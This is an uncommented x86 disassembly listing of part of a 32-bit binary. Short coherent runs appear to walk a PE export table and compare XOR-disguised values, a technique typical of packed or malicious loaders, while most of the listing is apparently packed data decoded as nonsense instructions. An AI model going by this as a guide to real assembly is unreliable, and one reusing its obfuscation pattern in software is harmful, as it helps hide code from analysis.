  40289c:	aam    0xa3
  40289e:	iret   
  40289f:	xor    bl,BYTE PTR [ebp+0xe840f45]
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	add    BYTE PTR [ebx+0xc7f845],cl
  4028ad:	lea    ebx,[esi]
  4028af:	xor    al,0x60
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	dec    edi
  4028e2:	adc    edi,DWORD PTR [ebx+0x7c08ddf1]
  4028e8:	jl     0x402951
  4028ea:	jle    0x402968
  4028ec:	jl     0x402920
  4028ee:	dec    esp
  4028ef:	add    BYTE PTR [eax+eiz*1+0x33],0xb7
  4028f4:	retf   0xe15b
  4028f7:	push   ss
  4028f8:	retf   
  4028f9:	fst    DWORD PTR [edx+0x48f53615]
  4028ff:	(bad)  
  402900:	(bad)  
  402901:	push   ecx
  402902:	pop    esp
  402903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402904:	add    DWORD PTR [edx-0x2f],0xfffffff9
  402908:	and    eax,0xe2240b54
  40290d:	xchg   edi,eax
  40290e:	adc    al,0xdd
  402910:	ret    0xf594
  402913:	out    0xfb,eax
  402915:	outs   dx,BYTE PTR ds:[esi]
  402916:	adc    DWORD PTR [ebx-0x1e3f7c3d],edi
  40291c:	sahf   
  40291d:	std    
  40291e:	inc    edx
  40291f:	jp     0x402901
  402921:	dec    eax
  402922:	jno    0x402911
  402924:	cmc    
  402925:	popf   
  402926:	mov    al,ds:0xb66ac906
  40292b:	ins    BYTE PTR es:[edi],dx
  40292c:	mov    edx,0xb2a193a6
  402931:	in     eax,dx
  402932:	mov    ecx,0xcd9dd88d
  402937:	inc    edi
  402938:	xor    BYTE PTR [ebx-0x47],bl
  40293b:	sbb    DWORD PTR [edi-0x772cd627],0x78
  402942:	fucom  st(0)
  402944:	xchg   BYTE PTR [edx+eiz*1+0x43],cl
  402948:	jb     0x4029be
  40294a:	dec    esi
  40294b:	nop
  40294c:	and    eax,0x158b30c2
  402951:	xchg   ebp,eax
  402952:	mov    bh,0x80
  402954:	sbb    al,0x31
  402956:	fcomp  DWORD PTR [esi+0x31]
  402959:	mov    DWORD PTR [ecx],ebx
  40295b:	leave  
  40295c:	or     BYTE PTR [eax+0x72],cl
  40295f:	mov    gs,WORD PTR [edx]
  402961:	leave  
  402962:	sub    edi,DWORD PTR [ecx+ebx*1+0x68a19855]
  402969:	xor    al,0x2a
  40296b:	cli    
  40296c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40296d:	add    eax,0x22545fd4
  402972:	fstp   DWORD PTR [ecx+0x29]
  402975:	shl    dl,1
  402977:	jbe    0x40293a
  402979:	sbb    ah,BYTE PTR [ecx-0x6d6d809a]
  40297f:	pusha  
  402980:	push   ss
  402981:	das    
  402982:	add    al,0xba
  402984:	push   ecx
  402985:	shr    BYTE PTR [esi-0x2d],1
  402988:	sub    BYTE PTR [esi],ch
  40298a:	push   ebp
  40298b:	inc    edi
  40298c:	icebp  
  40298d:	xchg   ecx,eax
  40298e:	shr    DWORD PTR [eax+edi*4],1
  402991:	lahf   
  402992:	mov    eax,ds:0x46f8df9f
  402997:	mov    ecx,0x84310914
  40299c:	(bad)  
  40299d:	int3   
  40299e:	pushf  
  40299f:	sbb    BYTE PTR [ebp-0x1d],ch
  4029a2:	adc    BYTE PTR [ebx-0x49146aaa],bh
  4029a8:	aaa    
  4029a9:	mov    ah,0xea
  4029ab:	xor    ch,BYTE PTR ds:[eax+0x7b]
  4029af:	mov    dl,0xd8
  4029b1:	(bad)  
  4029b2:	fild   WORD PTR [ebx]
  4029b4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4029b6:	fsub   DWORD PTR [ebx]
  4029b8:	mov    DWORD PTR [edx],esi
  4029ba:	add    eax,0x37c7cde1
  4029bf:	sbb    bl,BYTE PTR [esi+0x71]
  4029c2:	fadd   QWORD PTR [edi+0x2e650ac9]
  4029c8:	mov    cs,WORD PTR [ebx-0x36]
  4029cb:	fst    DWORD PTR [ebp-0x758beaf9]
  4029d1:	loope  0x4029c4
  4029d3:	out    0x83,eax
  4029d5:	jbe    0x402a3e
  4029d7:	outs   dx,DWORD PTR ds:[esi]
  4029d8:	into   
  4029d9:	fbld   TBYTE PTR [edx-0x3f]
  4029dc:	nop
  4029dd:	ret    
  4029de:	add    BYTE PTR [esi+ebp*8-0x4c],al
  4029e2:	adc    al,BYTE PTR [esi+ebx*1]
  4029e5:	jne    0x4029da
  4029e7:	cmp    ebp,DWORD PTR [ecx-0x3e]
  4029ea:	pop    eax
  4029eb:	fcom   DWORD PTR [edx-0x8d444fe]
  4029f1:	jle    0x402a61
  4029f3:	push   ds
  4029f4:	and    esi,DWORD PTR [ebx]
  4029f6:	cmc    
  4029f7:	adc    BYTE PTR [edi],bl
  4029f9:	test   eax,esp
  4029fb:	icebp  
  4029fc:	out    dx,al
  4029fd:	out    0x4d,eax
  4029ff:	mov    BYTE PTR [ebx+0x35],bl
  402a02:	jle    0x402a58
  402a04:	and    ebp,DWORD PTR [eax+0x7b]
  402a07:	xor    DWORD PTR ds:[edx+0x5b153111],esi
  402a0e:	and    al,0x9b
  402a10:	addr16 push ds
  402a12:	pop    edi
  402a13:	mov    ebx,ebx
  402a15:	inc    eax
  402a16:	mov    edi,0xb65f2eaa
  402a1b:	inc    esi
  402a1c:	sbb    BYTE PTR [edx-0x5a],bh
  402a1f:	std    
  402a20:	ror    DWORD PTR [edi],cl
  402a22:	dec    eax
  402a23:	std    
  402a24:	xchg   esi,eax
  402a25:	mov    edi,0xaf1abb0b
  402a2a:	mov    BYTE PTR [esi],cl
  402a2c:	mov    dh,0x96
  402a2e:	pop    ebp
  402a2f:	adc    al,0x98
  402a31:	push   esi
  402a32:	repz mov bh,0x3
  402a35:	dec    edi
  402a36:	jmp    0x4029be
  402a38:	push   edi
  402a39:	shl    BYTE PTR [ebp-0x39],0xc5
  402a3d:	add    DWORD PTR [esp+ebp*4],ebp
  402a40:	iret   
  402a41:	xor    DWORD PTR cs:[ebx+0x2],edi
  402a45:	clc    
  402a46:	dec    eax
  402a47:	cs call 0x83e4f166
  402a4d:	add    DWORD PTR [edi+0x6c66a406],eax
  402a53:	xchg   DWORD PTR [ecx+edx*2],ebx
  402a56:	(bad)  
  402a57:	sub    eax,0x2f30c05a
  402a5c:	std    
  402a5d:	mov    cl,0xaf
  402a5f:	sub    esp,DWORD PTR [ebx-0x49]
  402a62:	lods   eax,DWORD PTR ds:[esi]
  402a63:	outs   dx,DWORD PTR gs:[esi]
  402a65:	sub    al,0x82
  402a67:	std    
  402a68:	ret    
  402a69:	mov    ecx,ecx
  402a6b:	fs aaa 
  402a6d:	and    al,0xb4
  402a6f:	cmp    ebp,0x7c
  402a72:	sub    ebp,edi
  402a74:	(bad)  
  402a76:	cdq    
  402a77:	sub    eax,0xae56f51f
  402a7c:	jae    0x402a80
  402a7e:	jae    0x402a6a
  402a80:	pop    ecx
  402a81:	sub    ebx,DWORD PTR [edx+0x76719e80]
  402a87:	push   esi
  402a88:	(bad)  
  402a89:	adc    DWORD PTR [esi-0x66],edx
  402a8c:	(bad)  
  402a8e:	xchg   esp,eax
  402a8f:	pop    edi
  402a90:	jge    0x402af8
  402a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a93:	mov    eax,ds:0xe75e11ee
  402a98:	dec    ebp
  402a99:	pop    esi
  402a9a:	pop    edi
  402a9b:	pop    ds
  402a9c:	mov    bl,0x2f
  402a9e:	pop    ecx
  402a9f:	in     eax,dx
  402aa0:	mov    esp,DWORD PTR [ebx+0x6]
  402aa3:	or     ecx,ebp
  402aa5:	mov    al,0x2e
  402aa7:	ror    bl,cl
  402aa9:	retf   0x382d
  402aac:	dec    esp
  402aad:	add    ebp,DWORD PTR [ecx+0x53cfcee]
  402ab3:	mov    cl,0x22
  402ab5:	sbb    esi,DWORD PTR [edi]
  402ab7:	push   eax
  402ab8:	dec    edi
  402ab9:	sbb    eax,0x258d37a0
  402abe:	cdq    
  402abf:	mov    ds:0x6d3b46ac,al
  402ac4:	sub    BYTE PTR [esp+edx*2-0x5043bd44],bh
  402acb:	xchg   edi,eax
  402acc:	pop    ebp
  402acd:	cmp    DWORD PTR [esi],ebx
  402acf:	inc    eax
  402ad0:	div    DWORD PTR [ecx]
  402ad2:	fsubr  QWORD PTR [esi-0x5748066d]
  402ad8:	lock xchg esp,eax
  402ada:	adc    al,0xb8
  402adc:	and    al,BYTE PTR [edx+0x47c8a65a]
  402ae2:	mov    ah,0x10
  402ae4:	cmc    
  402ae5:	mov    edx,0xfbdf906c
  402aea:	push   ss
  402aeb:	cmc    
  402aec:	inc    ebp
  402aed:	inc    ebp
  402aee:	retf   0x4d67
  402af1:	xchg   bl,dh
  402af3:	push   0x947d0cc4
  402af8:	dec    edi
  402af9:	cwde   
  402afa:	adc    ah,cl
  402afc:	jb     0x402b13
  402afe:	fucomi st,st(6)
  402b00:	pop    ecx
  402b01:	fisttp WORD PTR [esi]
  402b03:	(bad)  
  402b05:	sbb    edi,DWORD PTR [edi+0x3b]
  402b08:	fnsave [ebx+edi*2-0x3d9f8621]
  402b0f:	cmp    BYTE PTR [esi],ch
  402b11:	int3   
  402b12:	xchg   ebp,eax
  402b13:	cmp    eax,0xc5a27a6d
  402b18:	arpl   WORD PTR [esi],bx
  402b1a:	pop    eax
  402b1b:	in     eax,dx
  402b1c:	aam    0xed
  402b1e:	and    ch,BYTE PTR [ecx+0x662f602b]
  402b24:	retf   
  402b25:	lahf   
  402b26:	push   eax
  402b27:	xor    ecx,DWORD PTR [edi+0x1fd440d8]
  402b2d:	int    0xc1
  402b2f:	lahf   
  402b30:	lea    ecx,[ebx+0x93af83d]
  402b36:	xchg   edi,eax
  402b37:	or     dh,BYTE PTR [ebx+eiz*4]
  402b3a:	dec    ecx
  402b3b:	xor    BYTE PTR [eax+edx*1],bh
  402b3e:	and    ah,dh
  402b40:	test   BYTE PTR [edi],cl
  402b42:	leave  
  402b43:	das    
  402b44:	dec    eax
  402b45:	or     ch,cl
  402b47:	inc    ebx
  402b48:	ret    0xd1a4
  402b4b:	jns    0x402bc3
  402b4d:	pop    esi
  402b4e:	push   edi
  402b4f:	jb     0x402b8b
  402b51:	and    eax,DWORD PTR [edi]
  402b53:	pop    edx
  402b54:	xchg   esi,eax
  402b55:	je     0x402b9a
  402b57:	mov    dl,0xd9
  402b59:	dec    esi
  402b5a:	mov    esi,0xff3b88cc
  402b5f:	and    BYTE PTR es:[ebx+0x1d],0xd6
  402b64:	pusha  
  402b65:	int3   
  402b66:	pop    esp
  402b67:	xchg   esi,eax
  402b68:	je     0x402b85
  402b6a:	icebp  
  402b6b:	rcr    BYTE PTR cs:[edx],0x63
  402b6f:	test   DWORD PTR [ecx-0x4],edi
  402b72:	mov    DWORD PTR [esi-0x51d42032],edi
  402b78:	jbe    0x402b43
  402b7a:	mov    dl,0x19
  402b7c:	jmp    0x402bc1
  402b7e:	js     0x402bee
  402b80:	mov    esp,0xca8caa2e
  402b85:	or     ebp,DWORD PTR [edx+0x4]
  402b88:	cmp    BYTE PTR [edi-0x5a],0xfc
  402b8c:	(bad)  
  402b8d:	lods   al,BYTE PTR ds:[esi]
  402b8e:	jno    0x402b58
  402b90:	jmp    0xd76b:0x287f933c
  402b97:	lods   al,BYTE PTR ss:[esi]
  402b99:	hlt    
  402b9a:	xlat   BYTE PTR ds:[ebx]
  402b9b:	daa    
  402b9c:	out    dx,eax
  402b9d:	pop    edi
  402b9e:	add    BYTE PTR [ebx+0xb],cl
  402ba1:	aam    0x2f
  402ba3:	adc    BYTE PTR [edi],dl
  402ba5:	add    ch,bh
  402ba7:	repz out dx,al
  402ba9:	jge    0x402c29
  402bab:	fdivr  DWORD PTR [edx+0x68]
  402bae:	pop    eax
  402baf:	es in  al,dx
  402bb1:	ins    DWORD PTR es:[edi],dx
  402bb2:	lea    esi,[ecx-0x77]
  402bb5:	or     DWORD PTR [esi],edx
  402bb7:	or     eax,esp
  402bb9:	dec    esp
  402bba:	pop    ds
  402bbb:	xchg   edi,eax
  402bbc:	xchg   ebp,eax
  402bbd:	in     eax,dx
  402bbe:	mov    ebx,DWORD PTR [esi-0x3a]
  402bc1:	lods   eax,DWORD PTR ds:[esi]
  402bc2:	cwde   
  402bc3:	test   DWORD PTR ds:0x87ce2593,0x72f7afb4
  402bcd:	dec    esp
  402bce:	les    edx,FWORD PTR [ebx-0x2d22e88c]
  402bd4:	icebp  
  402bd5:	pop    eax
  402bd6:	mov    eax,DWORD PTR [eax+0x3c]
  402bd9:	lea    ecx,[ecx*8+0x78]
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	jg     0x402c15
  402c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c6f:	into   
  402c70:	les    edx,FWORD PTR ds:0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	popa   
  402c79:	jb     0x402c01
  402c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c7c:	xlat   BYTE PTR ds:[ebx]
  402c7d:	xor    edx,ebp
  402c7f:	cs adc al,0x31
  402c82:	div    BYTE PTR [ebx+0x7a0f8fc5]
  402c88:	call   0xfbc8:0x514cf93c
  402c8f:	mov    ch,0xd7
  402c91:	in     al,0x4c
  402c93:	frstor [eax-0x26]
  402c96:	nop
  402c97:	ret    0x5307
  402c9a:	std    
  402c9b:	cmp    BYTE PTR [ecx+0x27],cl
  402c9e:	fdivr  QWORD PTR [edi]
  402ca0:	xchg   esp,eax
  402ca1:	ins    DWORD PTR es:[edi],dx
  402ca2:	bound  ebp,QWORD PTR [edx]
  402ca4:	dec    eax
  402ca5:	and    BYTE PTR [esp+edx*2+0x75d0c57f],0x26
  402cad:	pop    ecx
  402cae:	cli    
  402caf:	mov    esp,0x4fe8381b
  402cb4:	cmp    BYTE PTR [ebx],cl
  402cb6:	ss pop es
  402cb8:	movhlps xmm3,xmm3
  402cbb:	not    BYTE PTR [esi-0x3e]
  402cbe:	or     al,0xa0
  402cc0:	repz push eax
  402cc2:	retf   
  402cc3:	cmp    al,0x80
  402cc5:	push   ebp
  402cc6:	mov    edi,0x38ec4ffb
  402ccb:	ficom  WORD PTR ds:0xdf24198a
  402cd1:	ja     0x402ca9
  402cd3:	fst    DWORD PTR [esi-0x56f7ee15]
  402cd9:	push   cs
  402cda:	push   ebx
  402cdb:	mov    esi,0x7ad88328
  402ce0:	(bad)  
  402ce1:	mov    WORD PTR [edi+0x4c5f8668],?
  402ce7:	sti    
  402ce8:	and    eax,0x20a48968
  402ced:	outs   dx,BYTE PTR ds:[esi]
  402cee:	cdq    
  402cef:	fsubr  DWORD PTR [eax+ecx*8-0x65]
  402cf3:	in     eax,dx
  402cf4:	cld    
  402cf5:	jb     0x402c79
  402cf7:	sahf   
  402cf8:	sub    eax,0x7a45f695
  402cfd:	pop    es
  402cfe:	mov    dl,0x27
  402d00:	pop    ds
  402d01:	lock test BYTE PTR [ecx+0x3b],dl
  402d05:	mov    esp,0xa2b63662
  402d0a:	jae    0x402d08
  402d0c:	call   0xd28af6c5
  402d11:	push   ebp
  402d12:	pop    ss
  402d13:	loope  0x402ce3
  402d15:	pop    esp
  402d16:	and    edi,DWORD PTR [edi]
  402d18:	jne    0x402cd9
  402d1a:	aam    0x4d
  402d1c:	sbb    DWORD PTR [esp+eiz*2+0x30706524],0xffffffd4
  402d24:	push   edi
  402d25:	xor    DWORD PTR [ebx],esp
  402d27:	sbb    al,0x84
  402d29:	xor    eax,0x6d39baef
  402d2e:	xchg   edi,eax
  402d2f:	inc    eax
  402d30:	inc    ebp
  402d31:	add    edx,edi
  402d33:	clc    
  402d34:	jmp    0xef26213b
  402d39:	sub    eax,0xeaba3e8f
  402d3e:	(bad)  
  402d42:	cmp    dh,BYTE PTR [ecx+0x7d]
  402d45:	sbb    al,0x1d
  402d47:	call   0x6961:0xcaa5b949
  402d4e:	inc    DWORD PTR [esi+0x10]
  402d51:	dec    edx
  402d52:	mov    BYTE PTR [ebx-0x47],bl
  402d55:	aam    0x56
  402d57:	mov    eax,0xf49c279a
  402d5c:	pop    ds
  402d5d:	mov    DWORD PTR ds:0xf61bfb74,esi
  402d63:	mov    ecx,0xd3f7579d
  402d68:	or     esp,DWORD PTR [ebp+esi*8+0x24]
  402d6c:	loope  0x402d98
  402d6e:	inc    ecx
  402d6f:	sti    
  402d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d71:	outs   dx,BYTE PTR ds:[esi]
  402d72:	jecxz  0x402d34
  402d74:	ds int3 
  402d76:	dec    esp
  402d77:	(bad)  
  402d79:	pop    edi
  402d7a:	dec    dx
  402d7c:	pushf  
  402d7d:	xchg   edx,eax
  402d7e:	inc    edi
  402d7f:	icebp  
  402d80:	test   eax,0x8292c8be
  402d85:	ins    BYTE PTR es:[edi],dx
  402d86:	jae    0x402d0d
  402d88:	sub    BYTE PTR [edi-0x1d099897],0x47
  402d8f:	lock dec ebx
  402d91:	test   DWORD PTR [eax+ebx*2+0xea839dd],ecx
  402d98:	sbb    al,ch
  402d9a:	fistp  DWORD PTR ds:0x457daf67
  402da0:	push   0xf8c5acdc
  402da5:	xor    dh,0x3d
  402da8:	in     eax,0x27
  402daa:	gs fcomp st(6)
  402dad:	aaa    
  402dae:	jb     0x402d93
  402db0:	and    eax,DWORD PTR [edx+0x37290780]
  402db6:	jbe    0x402e16
  402db8:	rcl    BYTE PTR [esi],0x87
  402dbb:	(bad)  
  402dbc:	jns    0x402e09
  402dbe:	ret    0x4a9c
  402dc1:	mov    ecx,0xb076e086
  402dc6:	bound  esi,QWORD PTR [edi+0x64]
  402dc9:	inc    eax
  402dca:	retfw  0xf791
  402dce:	dec    edi
  402dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd1:	rcr    DWORD PTR [eax+0x53a4a441],cl
  402dd7:	retf   
  402dd8:	sub    dh,ch
  402dda:	and    dl,BYTE PTR [edi]
  402ddc:	sub    BYTE PTR [ebx],dh
  402dde:	arpl   WORD PTR [edi+eax*2-0x3],si
  402de2:	and    edi,esp
  402de4:	push   edx
  402de5:	push   ebp
  402de6:	jge    0x402d7b
  402de8:	and    dl,BYTE PTR [eax+ecx*8-0xb3bd017]
  402def:	push   cs
  402df0:	push   eax
  402df1:	pusha  
  402df2:	jno    0x402e26
  402df4:	xor    bh,BYTE PTR [eax-0x4c]
  402df7:	inc    ecx
  402df8:	or     eax,0xea6634af
  402dfd:	mov    bl,0xdd
  402dff:	jl     0x402ded
  402e01:	mov    eax,0x4016891b
  402e06:	push   es
  402e07:	xabort 0x98
  402e0a:	test   dl,dh
  402e0c:	sbb    dh,BYTE PTR [ecx]
  402e0e:	xchg   eax,eax
  402e10:	mov    ebp,0xaa447b22
  402e15:	sar    DWORD PTR [eax+eiz*2+0x21],1
  402e19:	dec    ebx
  402e1a:	fmul   st,st(5)
  402e1c:	neg    BYTE PTR [eax+0x246e328c]
  402e22:	test   esi,ebp
  402e24:	(bad)  
  402e25:	pop    ds
  402e26:	and    cl,BYTE PTR [ebp-0x7d]
  402e29:	(bad)  
  402e2a:	sete   BYTE PTR [ebx+eax*2-0x2f]
  402e2f:	les    edi,FWORD PTR [ebx-0x61]
  402e32:	and    eax,edx
  402e34:	add    ebx,edx
  402e36:	out    0xbe,al
  402e38:	dec    esi
  402e39:	inc    eax
  402e3a:	sub    ah,BYTE PTR [edx+0x6]
  402e3d:	pop    ds
  402e3e:	mov    dh,0x1c
  402e40:	inc    eax
  402e41:	aam    0xa2
  402e43:	xchg   edi,eax
  402e44:	int3   
  402e45:	jbe    0x402e7d
  402e47:	daa    
  402e48:	in     al,dx
  402e49:	test   DWORD PTR [edx+eax*8-0x34a25e00],ebx
  402e50:	loope  0x402e2b
  402e52:	mov    dl,0x8f
  402e54:	or     DWORD PTR [ebx-0x32],eax
  402e57:	mov    esi,0x1d5eec58
  402e5c:	jo     0x402eb5
  402e5e:	test   al,0x5a
  402e60:	mov    dh,0xa7
  402e62:	imul   ecx,DWORD PTR [edi],0xffffff9d
  402e65:	push   es
  402e66:	shl    BYTE PTR [eax+0x7042d990],cl
  402e6c:	shl    dl,cl
  402e6e:	push   ds
  402e6f:	inc    ebp
  402e70:	not    BYTE PTR ds:0x4e3fb79e
  402e76:	xchg   esi,eax
  402e77:	xchg   edx,eax
  402e78:	cli    
  402e79:	in     eax,dx
  402e7a:	sahf   
  402e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7c:	retf   
  402e7d:	adc    DWORD PTR [edx-0x461756ae],ebx
  402e83:	adc    DWORD PTR [edx+0x32],ebp
  402e86:	mov    ds:0x174034c5,al
  402e8b:	lods   eax,DWORD PTR ds:[esi]
  402e8c:	dec    BYTE PTR [ecx-0x1aa73f2]
  402e92:	add    eax,0xb58c78b9
  402e97:	mov    BYTE PTR [edi+0x1d],dh
  402e9a:	and    ah,ah
  402e9c:	outs   dx,BYTE PTR ds:[esi]
  402e9d:	cmp    eax,0x8dbfa9d1
  402ea2:	mov    ch,0xc2
  402ea4:	cmp    BYTE PTR [esp+eax*8-0x3250b7fc],ch
  402eab:	fistp  DWORD PTR [edi-0x169d1e46]
  402eb1:	(bad)  
  402eb3:	mov    ds:0x45049623,eax
  402eb8:	mov    ch,0x31
  402eba:	jne    0x402e9b
  402ebc:	push   ebx
  402ebd:	sbb    DWORD PTR [esi+0x2e],0x362d12c1
  402ec4:	addr16 mov eax,0xfc42bf35
  402eca:	jmp    0x402e9b
  402ecc:	xchg   edi,eax
  402ecd:	adc    ecx,DWORD PTR [esi-0x2aa954b]
  402ed3:	test   dl,cl
  402ed5:	out    0xfc,eax
  402ed7:	stc    
  402ed8:	inc    ebp
  402ed9:	jp     0x402e93
  402edb:	mov    bh,0xa7
  402edd:	dec    edi
  402ede:	xlat   BYTE PTR ds:[ebx]
  402edf:	xchg   esi,eax
  402ee0:	pop    ds
  402ee1:	add    eax,0xdd91c2ca
  402ee6:	jo     0x402f65
  402ee8:	sub    dl,bh
  402eea:	and    cl,bl
  402eec:	fimul  WORD PTR cs:[esi+0x4]
  402ef0:	aas    
  402ef1:	push   ebp
  402ef2:	ror    DWORD PTR [ecx-0x26b8b1b5],cl
  402ef8:	mov    al,ds:0x7a2ab6e6
  402efd:	fisttp DWORD PTR [ecx+0x2f]
  402f00:	cmp    DWORD PTR [ebp+0x3e575c3a],edx
  402f06:	call   0xe3e3:0x940f81c8
  402f0d:	aas    
  402f0e:	adc    ebp,DWORD PTR [ecx-0x6b241296]
  402f14:	mov    DWORD PTR [edi-0x2ce4a220],edi
  402f1a:	dec    eax
  402f1b:	and    esp,DWORD PTR [ebp-0x2214c75d]
  402f21:	imul   BYTE PTR [esi-0x47]
  402f24:	retf   0xc35c
  402f27:	xchg   ebx,eax
  402f28:	inc    eax
  402f29:	inc    esi
  402f2a:	pop    esp
  402f2b:	rcl    BYTE PTR [ecx+0x5b],cl
  402f2e:	mov    ch,0xf3
  402f30:	inc    ebx
  402f31:	loopne 0x402f61
  402f33:	loop   0x402f5e
  402f35:	imul   ebp,ecx,0x75dc3c9
  402f3b:	retf   0x9106
  402f3e:	sbb    BYTE PTR [ecx+0x38f04dc5],dh
  402f44:	ret    
  402f45:	and    ch,ch
  402f47:	lods   eax,DWORD PTR ds:[esi]
  402f48:	je     0x402f60
  402f4a:	jmp    0x402f4a
  402f4c:	shl    BYTE PTR [esi-0x16],0x74
  402f50:	cwde   
  402f51:	shl    DWORD PTR [eax*8-0x62bf395e],cl
  402f58:	jmp    0x402fc7
  402f5a:	jge    0x402ef2
  402f5c:	dec    edi
  402f5d:	out    0xab,al
  402f5f:	pop    edi
  402f60:	mov    bh,0xff
  402f62:	jne    0x402f5c
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0x6adc:0x1360eb95
  402f8e:	add    esi,DWORD PTR [edx+0x2f]
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x403016
  402f99:	cmp    al,0x39
  402f9b:	sub    BYTE PTR [ebx],0xd0
  402f9e:	jg     0x402fc2
  402fa0:	adc    DWORD PTR [ecx+0x16],edx
  402fa3:	inc    edi
  402fa4:	jp     0x402ffa
  402fa6:	xor    BYTE PTR [eax-0x2],al
  402fa9:	adc    BYTE PTR [edi],bh
  402fab:	or     eax,0x340db6d4
  402fb0:	test   bh,0xf8
  402fb3:	fs (bad) 
  402fb5:	and    ebx,esi
  402fb7:	sbb    DWORD PTR [eax-0x5a],ecx
  402fba:	or     al,BYTE PTR [ebx+edx*8+0x73fe7a7c]
  402fc1:	call   DWORD PTR [eax-0x1d]
  402fc4:	das    
  402fc5:	rcr    DWORD PTR [ecx+esi*4+0x58],0x19
  402fca:	and    edi,ebx
  402fcc:	retf   
  402fcd:	inc    ebp
  402fce:	inc    edx
  402fcf:	xor    bl,BYTE PTR [esp+ecx*4-0x5c4869bd]
  402fd6:	int3   
  402fd7:	jmp    0x402fb6
  402fd9:	shl    bl,0xff
  402fdc:	push   ds
  402fdd:	sbb    al,0x17
  402fdf:	test   BYTE PTR ds:0x128d1827,cl
  402fe5:	mov    esi,0x26e259b
  402fea:	mov    ebp,0xb59e660
  402fef:	cmp    al,0xb7
  402ff1:	ss jl  0x402fca
  402ff4:	dec    eax
  402ff5:	lds    edi,FWORD PTR [edx]
  402ff7:	push   ebp
  402ff8:	scas   eax,DWORD PTR es:[edi]
  402ff9:	mov    edi,esp
  402ffb:	ins    DWORD PTR es:[edi],dx
  402ffc:	in     al,dx
  402ffd:	dec    ebp
  402ffe:	fadd   QWORD PTR [eax-0x3b]
  403001:	mov    gs,WORD PTR [edx+0x26acc4ff]
  403007:	adc    bh,BYTE PTR [edx+0x4ec7e05e]
  40300d:	test   eax,0x611e48cd
  403012:	xor    BYTE PTR [edi-0x69],ah
  403015:	outs   dx,DWORD PTR ds:[esi]
  403016:	adc    edi,edx
  403018:	pop    ecx
  403019:	cmp    al,0xf2
  40301b:	fistp  WORD PTR [ebx-0x4e]
  40301e:	add    DWORD PTR [esi+0x11f27a80],ecx
  403024:	stc    
  403025:	mov    ss,WORD PTR [ebx-0x57]
  403028:	cmp    esp,DWORD PTR [eax]
  40302a:	test   DWORD PTR [ebp-0x69202044],0x92e6f636
